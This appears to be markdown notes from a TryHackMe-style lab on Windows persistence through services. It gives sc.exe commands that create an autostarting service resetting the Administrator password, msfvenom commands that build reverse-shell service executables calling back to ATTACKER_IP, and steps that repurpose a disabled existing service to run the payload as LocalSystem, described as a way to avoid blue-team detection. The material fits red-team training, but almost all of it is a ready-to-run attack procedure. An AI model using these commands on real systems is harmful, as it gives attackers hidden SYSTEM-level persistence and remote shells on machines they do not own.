# Abusing services

## Creating backdoor services

Create and start a service named `service` using the following commands:

    sc.exe create <service> binPath= "net user Administrator <password>" start= auto
    sc.exe start <service>

Note: There must be a space after each equal sign for the command to work.

The `net user` command will be executed when the service is started, resetting the Administrator's password to 
`password`. The service has been set to start automatically (`start= auto`), so that it runs without requiring user 
interaction.

We can also create a reverse shell with `msfvenom` and associate it with the created service. Service executables 
are unique since they need to implement a particular protocol to be handled by the system. If you want to create an 
executable that is compatible with Windows services, you can use the `exe-service` format in msfvenom:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe

Copy the executable to the target system, say in `C:\Windows` and point the service's `binPath` to it:

    sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
    sc.exe start THMservice2

This creates a connection back to your attacker's machine (if all went well).

## Modifying existing services

While creating new services for persistence works quite well, the blue team may monitor new service creation 
across the network. We may want to reuse an existing service instead of creating one to avoid detection. 
Any disabled service will be a good candidate, as it can be altered without the user noticing it.

Get a list of available services:

    sc.exe query state=all

Query the service's configuration:

    sc.exe qc <service>

For using a service for persistence:

* The executable `BINARY_PATH_NAME` points to the payload.
* The service `START_TYPE` is automatic so that the payload runs without user interaction.
* The `SERVICE_START_NAME`, which is the account under which the service will run, is preferably set to `LocalSystem` 
to gain `SYSTEM` privileges.

Create a reverse shell with msfvenom:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe

Reconfigure the `service` parameters:

    sc.exe config <service> binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"

Query the service's configuration again to check all went as expected:

    sc.exe qc <service>


